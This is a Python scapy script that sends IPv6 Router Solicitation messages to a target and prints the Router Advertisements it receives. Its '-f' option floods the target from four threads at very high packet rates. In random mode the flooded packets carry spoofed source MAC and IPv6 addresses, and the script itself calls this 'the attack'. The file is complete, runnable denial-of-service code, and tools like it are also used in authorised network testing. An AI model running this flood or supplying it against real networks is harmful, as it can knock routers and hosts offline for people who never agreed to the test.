#!/usr/bin/python3
import argparse
import logging
import multiprocessing
import random
import sys
import threading
import time
from collections import Counter

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6ND_RS, ICMPv6NDOptSrcLLAddr, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, \
    ICMPv6NDOptRDNSS, ICMPv6NDOptMTU
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, srp1, sniff

from validate_parameters import is_valid_ipv6, is_valid_mac, convert_flag, convert_preference, is_valid_num, mac2ipv6


def parameter():
    parser = argparse.ArgumentParser(description="|> Sending arbitrary Router Solicitation message to specified target, "
                                                 "with option to flood.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping).")
    parser.add_argument("-dmac", dest="destination_mac", action="store",
                        help="the MAC address of receiver (resolved from the interface if skipping).")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping).")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::2"
                                                                            " if skipping).")
    parser.add_argument("-p", dest="period", type=int, action="store", help="send the RA messages periodically every "
                                                                            "defined seconds.")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending RS messages using only the defined addresses ("
                             "constant), or sending RS messages with many random addresses.")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][
            len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6]) - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::2"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination MAC address
    if args.destination_mac is not None:
        if not is_valid_mac(args.destination_mac):
            print("---> The given destination MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the period and flood
    if args.period is not None and args.flood is not None:
        print("---> Only one of two options (periodical sending, flooding) can exist. Try again!!!")
        sys.exit(1)
    if args.period is not None:
        if not is_valid_num(args.period):
            print("---> The given number of period is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.source_mac, args.destination_mac, args.source_ip, args.destination_ip, args.period, args.flood


def generate(interface, source_mac, destination_mac, source_ip, destination_ip, period, flood):
    # Generate the packet
    if destination_mac is None:
        layer2 = Ether(src=source_mac)
    if destination_mac is not None:
        layer2 = Ether(src=source_mac, dst=destination_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)
    packet1 = layer2 / layer3 / ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=source_mac)

    if period is None and flood is None:  # Normal situation
        print("Sending Router Solicitation message to the destination: " + destination_ip)
        # send the packet and receive the response
        sendp(packet1, iface=interface, verbose=False)

    if period is not None:
        print("Sending Router Solicitation every " + str(period) + " second(s) to the destination: " +
              destination_ip + " (press Ctrl+C to stop the program).....")
        sendp(packet1, verbose=False, iface=interface, inter=period, loop=1)

    if flood is not None:  # Flooding the target
        pkt_list = []
        print("Flooding the destination: " + destination_ip + "with Router Solicitation messages (press Ctrl+C "
                                                              "to stop the attack).....")
        if flood == "constant":
            for i in range(200):
                pkt_list.append(packet1)
        if flood == "random":
            for i in range(100):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(src=random_mac, dst="33:33:00:00:00:02")
                layer3 = IPv6(src=source_ip, dst=destination_ip)
                packet1 = layer2 / layer3 / ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_ip, destination_ip):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if ICMPv6ND_RA in packet:
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            print("+ Received Router Advertisement number #" + str(sum(packet_counts.values())))
            print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
            print("     Flags: M-" + convert_flag(packet[ICMPv6ND_RA].M) + ", O-" + convert_flag(
                packet[ICMPv6ND_RA].O) + ", H-" + convert_flag(
                packet[ICMPv6ND_RA].H) + ", A-" + convert_flag(
                packet[ICMPv6ND_RA].A) + ", L-" + convert_flag(packet[ICMPv6ND_RA].L) +
                  ", Preference-" + convert_preference(packet[ICMPv6ND_RA].prf))
            print("     Router time: Router lifetime (" + str(
                packet[ICMPv6ND_RA].routerlifetime) + "s), Reachable time (" + str(
                packet[ICMPv6ND_RA].reachabletime) + "ms), Retrans timer (" + str(
                packet[ICMPv6ND_RA].retranstimer) + "ms)")
            if ICMPv6NDOptRDNSS in packet:
                print("     DNS: " + str(packet[ICMPv6NDOptRDNSS].dns))
            if ICMPv6NDOptMTU in packet:
                print("     MTU: " + str(packet[ICMPv6NDOptMTU].mtu))
            if ICMPv6NDOptPrefixInfo in packet:
                print("     Prefix: " + packet[ICMPv6NDOptPrefixInfo].prefix + "/" + str(
                    packet[ICMPv6NDOptPrefixInfo].prefixlen))
                print("     Prefix time: Valid lifetime (" + str(
                    packet[ICMPv6NDOptPrefixInfo].validlifetime) + "s), Preferred lifetime (" + str(
                    packet[ICMPv6NDOptPrefixInfo].preferredlifetime) + "s)")
            print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=2)
    except KeyboardInterrupt:
        sys.exit(0)


def sniffing_forever(interface, source_ip, destination_ip):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if ICMPv6ND_RA in packet:
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            print("+ Received Router Advertisement number #" + str(sum(packet_counts.values())))
            print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
            print("     Flags: M-" + convert_flag(packet[ICMPv6ND_RA].M) + ", O-" + convert_flag(
                packet[ICMPv6ND_RA].O) + ", H-" + convert_flag(
                packet[ICMPv6ND_RA].H) + ", A-" + convert_flag(
                packet[ICMPv6ND_RA].A) + ", Preference-" + convert_preference(packet[ICMPv6ND_RA].prf))
            print("     Router time: Router lifetime (" + str(
                packet[ICMPv6ND_RA].routerlifetime) + "s), Reachable time (" + str(
                packet[ICMPv6ND_RA].reachabletime) + "ms), Retrans timer (" + str(
                packet[ICMPv6ND_RA].retranstimer) + "ms)")
            if ICMPv6NDOptRDNSS in packet:
                print("     DNS: " + str(packet[ICMPv6NDOptRDNSS].dns))
            if ICMPv6NDOptMTU in packet:
                print("     MTU: " + str(packet[ICMPv6NDOptMTU].mtu))
            if ICMPv6NDOptPrefixInfo in packet:
                print("     Prefix: " + packet[ICMPv6NDOptPrefixInfo].prefix + "/" + str(
                    packet[ICMPv6NDOptPrefixInfo].prefixlen) + ", Valid lifetime (" + str(
                    packet[ICMPv6NDOptPrefixInfo].validlifetime) + "s), Preferred lifetime (" + str(
                    packet[ICMPv6NDOptPrefixInfo].preferredlifetime) + "s)")
            print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, source_mac, destination_mac, source_ip, destination_ip, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, source_mac, destination_mac, source_ip, destination_ip, period, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_ip, destination_ip])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


def execute_functions_forever(interface, source_mac, destination_mac, source_ip, destination_ip, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, source_mac, destination_mac, source_ip, destination_ip, period, flood])
    p2 = multiprocessing.Process(target=sniffing_forever, args=[interface, source_ip, destination_ip])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, source_mac, destination_mac, source_ip, destination_ip, period, flood = parameter()
    if flood is None and period is None:
        try:
            execute_functions(interface, source_mac, destination_mac, source_ip, destination_ip, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    elif period is not None:
        try:
            execute_functions_forever(interface, source_mac, destination_mac, source_ip, destination_ip, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, source_mac, destination_mac, source_ip, destination_ip, period, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
